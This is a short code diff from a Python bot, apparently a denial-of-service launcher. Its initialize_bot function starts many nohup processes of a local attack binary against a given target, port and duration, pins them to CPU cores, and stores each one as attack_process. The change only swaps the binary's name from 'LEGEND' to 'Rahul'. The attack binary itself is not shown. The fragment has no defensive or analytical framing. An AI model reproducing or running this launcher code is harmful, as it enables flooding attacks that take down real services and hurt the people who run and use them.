@@ -389,7 +389,7 @@ def initialize_bot(bot, bot_id):
         num_instances = (1000 // threads_per_instance)
         core_mapping = [0, 0, 1, 1, 0, 0, 1, 1, 0]
         for i in range(num_instances):
-            full_command = ['nohup', './LEGEND', str(target), str(port), str(time), str(threads_per_instance)]
+            full_command = ['nohup', './Rahul', str(target), str(port), str(time), str(threads_per_instance)]
             core = core_mapping[i % len(core_mapping)]
             taskset_command = ['taskset', '-c', str(core)] + full_command
             attack_process = subprocess.Popen(taskset_command)
